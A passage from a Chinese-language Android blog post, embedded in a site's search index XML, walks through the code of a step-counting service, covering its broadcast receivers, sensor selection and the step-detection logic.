millisUntilFinished) &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @Override</span><br><span class="line">        public void onFinish() &#123;</span><br><span class="line">            &#x2F;&#x2F;如果计时器正常结束，则开始计步</span><br><span class="line">            time.cancel();</span><br><span class="line">            save();</span><br><span class="line">            startTimeCount();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>##代码分析<br>#####onCreate</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">@Override</span><br><span class="line">public void onCreate() &#123;</span><br><span class="line">    super.onCreate();</span><br><span class="line">    EXPECT_STEPS &#x3D; 8000f;</span><br><span class="line">    &#x2F;&#x2F;初始化广播</span><br><span class="line">    initBroadcastReceiver();</span><br><span class="line">    new Thread(new Runnable() &#123;</span><br><span class="line">        @Override</span><br><span class="line">        public void run() &#123;</span><br><span class="line">            &#x2F;&#x2F;获取传感器类型</span><br><span class="line">            startStepDetector();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;).start();</span><br><span class="line">    startTimeCount();</span><br><span class="line">    initTodayData();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码上写得很简单明了，即：<strong>初始广播，获取传感器类型，开始计时，以及初始化日期</strong></p><p>####初始化广播</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"> &#x2F;**</span><br><span class="line">     * 注册广播</span><br><span class="line">     *&#x2F;</span><br><span class="line">    private void initBroadcastReceiver() &#123;</span><br><span class="line">        final IntentFilter filter &#x3D; new IntentFilter();</span><br><span class="line">        &#x2F;&#x2F; 屏幕灭屏广播</span><br><span class="line">        filter.addAction(Intent.ACTION_SCREEN_OFF);</span><br><span class="line">        &#x2F;&#x2F;关机广播</span><br><span class="line">        filter.addAction(Intent.ACTION_SHUTDOWN);</span><br><span class="line">        &#x2F;&#x2F; 屏幕亮屏广播</span><br><span class="line">        filter.addAction(Intent.ACTION_SCREEN_ON);</span><br><span class="line">        &#x2F;&#x2F; 屏幕解锁广播</span><br><span class="line">        filter.addAction(Intent.ACTION_USER_PRESENT);</span><br><span class="line">        &#x2F;&#x2F; 当长按电源键弹出“关机”对话或者锁屏时系统会发出这个广播</span><br><span class="line">        &#x2F;&#x2F; 所以监听这个广播，当收到时就隐藏自己的对话，如点击pad右下角部分弹出的对话框</span><br><span class="line">        filter.addAction(Intent.ACTION_CLOSE_SYSTEM_DIALOGS);</span><br><span class="line">        &#x2F;&#x2F;监听日期变化</span><br><span class="line">        filter.addAction(Intent.ACTION_DATE_CHANGED);</span><br><span class="line">        filter.addAction(Intent.ACTION_TIME_CHANGED);</span><br><span class="line">        filter.addAction(Intent.ACTION_TIME_TICK);</span><br><span class="line"></span><br><span class="line">        mReceiver &#x3D; new BroadcastReceiver() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public void onReceive(Context context, Intent intent) &#123;</span><br><span class="line">                String action &#x3D; intent.getAction();</span><br><span class="line">                if(Intent.ACTION_SCREEN_ON.equals(action))&#123;</span><br><span class="line">                    Log.i(TAG,&quot;ScreenOn&quot;);</span><br><span class="line">                &#125; else if (Intent.ACTION_SCREEN_OFF.equals(action)) &#123;</span><br><span class="line">                    Log.i(TAG,&quot;ScreenOff&quot;);</span><br><span class="line">                    &#x2F;&#x2F;60s</span><br><span class="line">                    duration &#x3D; 6000;</span><br><span class="line">                &#125;else if (Intent.ACTION_USER_PRESENT.equals(action))&#123;</span><br><span class="line">                    Log.i(TAG,&quot;screen unlock&quot;);</span><br><span class="line">                    save();</span><br><span class="line">                    &#x2F;&#x2F;30s</span><br><span class="line">                    duration &#x3D; 3000;</span><br><span class="line">                &#125;else if(Intent.ACTION_SHUTDOWN.equals(action))&#123;</span><br><span class="line">                    Log.i(TAG,&quot;shutdown&quot;);</span><br><span class="line">                    save();</span><br><span class="line">                &#125;else if(Intent.ACTION_DATE_CHANGED.equals(action))&#123;</span><br><span class="line">                    save();</span><br><span class="line">                    isNewDay();</span><br><span class="line">                &#125;else if(Intent.ACTION_TIME_CHANGED.equals(action))&#123;</span><br><span class="line">                    save();</span><br><span class="line">                    isNewDay();</span><br><span class="line">                &#125;else if(Intent.ACTION_TIME_TICK.equals(action))&#123;</span><br><span class="line">                    save();</span><br><span class="line">&#x2F;&#x2F;                    isNewDay();</span><br><span class="line">                &#125;else if(&quot;ANewacount&quot;.equals(action))&#123;</span><br><span class="line"></span><br><span class="line">                    &#x2F;&#x2F;当时一个新用户登录的时候</span><br><span class="line">                    &#x2F;&#x2F;清除数据</span><br><span class="line">                    Log.i(TAG,&quot;收到新账户广播&quot;);</span><br><span class="line">                    initTodayData();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        registerReceiver(mReceiver,filter);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在这段代码里，主要是<strong>监听用户手机状态的改变</strong>，根据状态的改变进行不同的操作，如“用户关机时，将当前步数进行保存”、“当到达凌晨0点时需要进行新的一天的数据库更新”等等。<strong>别忘了注销Receiver</strong>哦</p><p>####获取传感器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line">    * 获取传感器实例</span><br><span class="line">    *&#x2F;</span><br><span class="line">   private void startStepDetector() &#123;</span><br><span class="line">       if(sensorManager!&#x3D;null)&#123;</span><br><span class="line">           sensorManager &#x3D; null;</span><br><span class="line">       &#125;</span><br><span class="line">       sensorManager &#x3D; (SensorManager) this.getSystemService(SENSOR_SERVICE);</span><br><span class="line">       addCountStepListener();</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line">   Sensor countSensor ;</span><br><span class="line">   Sensor detectorSensor ;</span><br><span class="line">   Sensor accelerateSensor;</span><br><span class="line">   private void addCountStepListener() &#123;</span><br><span class="line">        countSensor &#x3D; sensorManager.getDefaultSensor(Sensor.TYPE_STEP_COUNTER);</span><br><span class="line">        detectorSensor &#x3D; sensorManager.getDefaultSensor(Sensor.TYPE_STEP_DETECTOR);</span><br><span class="line">       &#x2F;&#x2F;利用加速度传感器</span><br><span class="line">       accelerateSensor &#x3D; sensorManager.getDefaultSensor(Sensor.TYPE_ACCELEROMETER);</span><br><span class="line"></span><br><span class="line">       if(countSensor!&#x3D;null)&#123;</span><br><span class="line">           &#x2F;&#x2F;选择计步传感器</span><br><span class="line">           stepSensor &#x3D; 0;</span><br><span class="line">           Log.i(TAG,&quot;计步传感器&quot;);</span><br><span class="line">           sensorManager.registerListener(StepService.this,countSensor,SENSOR_DELAY_NORMAL);</span><br><span class="line">       &#125;else if(detectorSensor!&#x3D;null)&#123;</span><br><span class="line">           &#x2F;&#x2F;步数检测器</span><br><span class="line">           stepSensor &#x3D; 1;</span><br><span class="line">           Log.i(TAG,&quot;步数监测器&quot;);</span><br><span class="line">           sensorManager.registerListener(StepService.this,detectorSensor,SENSOR_DELAY_FASTEST);</span><br><span class="line">       &#125;else if(accelerateSensor !&#x3D; null)&#123;</span><br><span class="line">           stepSensor &#x3D; 2;</span><br><span class="line">           int h &#x3D; 480;</span><br><span class="line">           mYOffset &#x3D; h * 0.5f;</span><br><span class="line">           mScale[0] &#x3D; -(h * 0.5f * (1.0f &#x2F; (SensorManager.STANDARD_GRAVITY * 2)));</span><br><span class="line">           mScale[1] &#x3D; -(h * 0.5f * (1.0f &#x2F; (SensorManager.MAGNETIC_FIELD_EARTH_MAX)));</span><br><span class="line">           Log.i(TAG,&quot;加速度传感器&quot;);</span><br><span class="line">           sensorManager.registerListener(StepService.this,accelerateSensor,SENSOR_DELAY_FASTEST);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个没什么好说的，就是获取各个传感器对象，首先选择的是计步传感器，如果没有计步传感器那么久检查是否有加速度传感器，同样的别忘了注销传感器对象。</p><p>####计步的核心代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line">   * 传感器回调</span><br><span class="line">   * @param event</span><br><span class="line">   *&#x2F;</span><br><span class="line">  @Override</span><br><span class="line">  public void onSensorChanged(SensorEvent event) &#123;</span><br><span class="line">      if(stepSensor &#x3D;&#x3D; 0)&#123;</span><br><span class="line">          int tempStep &#x3D; (int) event.values[0];</span><br><span class="line">          if(!hasRecord)&#123;</span><br><span class="line">              hasRecord &#x3D; true;</span><br><span class="line">              hasStepCount &#x3D; tempStep;</span><br><span class="line">          &#125;else&#123;</span><br><span class="line">              int thisStepCount &#x3D; tempStep -hasStepCount;</span><br><span class="line">              CURRENT_STEPS+&#x3D;(thisStepCount-previousStepCount);</span><br><span class="line">              previousStepCount &#x3D; thisStepCount;</span><br><span class="line">          &#125;</span><br><span class="line">          sendMessage();</span><br><span class="line">          setNotification();</span><br><span class="line">      &#125;else if(stepSensor &#x3D;&#x3D; 1)&#123;</span><br><span class="line">          if(event.values[0] &#x3D;&#x3D; 1.0)&#123;</span><br><span class="line">              hasRecord &#x3D; true;</span><br><span class="line">              CURRENT_STEPS++;</span><br><span class="line">              sendMessage();</span><br><span class="line">              setNotification();</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;else if(stepSensor &#x3D;&#x3D; 2)&#123;</span><br><span class="line">          hasRecord &#x3D; true;</span><br><span class="line">          synchronized (this) &#123;</span><br><span class="line">              float vSum &#x3D; 0;</span><br><span class="line">              for (int i &#x3D; 0; i &lt; 3; i++) &#123;</span><br><span class="line">                  final float v &#x3D; mYOffset + event.values[i] * mScale[1];</span><br><span class="line">                  vSum +&#x3D; v;</span><br><span class="line">              &#125;</span><br><span class="line">              int k &#x3D; 0;</span><br><span class="line">              float v &#x3D; vSum &#x2F; 3;</span><br><span class="line"></span><br><span class="line">              float direction &#x3D; (v &gt; mLastValues[k] ? 1</span><br><span class="line">                      : (v &lt; mLastValues[k] ? -1 : 0));</span><br><span class="line">              if (direction &#x3D;&#x3D; -mLastDirections[k]) &#123;</span><br><span class="line">                  &#x2F;&#x2F; Direction changed</span><br><span class="line">                  int extType &#x3D; (direction &gt; 0 ? 0 : 1); &#x2F;&#x2F; minumum or</span><br><span class="line">                  &#x2F;&#x2F; maximum?</span><br><span class="line">                  mLastExtremes[extType][k] &#x3D; mLastValues[k];</span><br><span class="line">                  float diff &#x3D; Math.abs(mLastExtremes[extType][k]</span><br><span class="line">                          - mLastExtremes[1 - extType][k]);</span><br><span class="line"></span><br><span class="line">                  if (diff &gt; SENSITIVITY) &#123;</span><br><span class="line">                      boolean isAlmostAsLargeAsPrevious &#x3D; diff &gt; (mLastDiff[k] * 2 &#x2F; 3);</span><br><span class="line">                      boolean isPreviousLargeEnough &#x3D; mLastDiff[k] &gt; (diff &#x2F; 3);</span><br><span class="line">                      boolean isNotContra &#x3D; (mLastMatch !&#x3D; 1 - extType);</span><br><span class="line"></span><br><span class="line">                      if (isAlmostAsLargeAsPrevious &amp;&amp; isPreviousLargeEnough</span><br><span class="line">                              &amp;&amp; isNotContra) &#123;</span><br><span class="line">                          end &#x3D; System.currentTimeMillis();</span><br><span class="line">                          if (end - start &gt; 500) &#123;&#x2F;&#x2F; 此时判断为走了一步</span><br><span class="line"></span><br><span class="line">                              CURRENT_STEPS++;</span><br><span class="line">                             sendMessage();</span><br><span class="line">                            setNotification();</span><br><span class="line">                              mLastMatch &#x3D; extType;</span><br><span class="line">                              start &#x3D; end;</span><br><span class="line">                          &#125;</span><br><span class="line">                      &#125; else &#123;</span><br><span class="line">                          mLastMatch &#x3D; -1;</span><br><span class="line">                      &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">                  mLastDiff[k] &#x3D; diff;</span><br><span class="line">              &#125;</span><br><span class="line">              mLastDirections[k] &#x3D; direction;</span><br><span class="line">              mLastValues[k] &#x3D; v;</span><br><span class="line">          &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>计步传感器<br>首先从传感器中拿到tempStep，它代表着从计步以来的总步数，所以需要记录上次走的步数，用这次步数减去上次走的步数得到的差值，再叠加，就可以得到当前走的总步数了。</li><li>加速度传感器<br>这部分的算法似乎是某个google的大神写的，我也没看懂</li><li>另外<br><code>sendMessage</code>和<code>setNotification</code>分别为更新UI界面和更新通知栏。</li></ul><p>##写在最后</p><blockquote><p>因为写这个功能的时候参看了不少代码，而且时间较为久了，参看了不少博文，忘了具体的博主了，这里就感谢所有博主了。ok，上课去了。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 手机计步 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
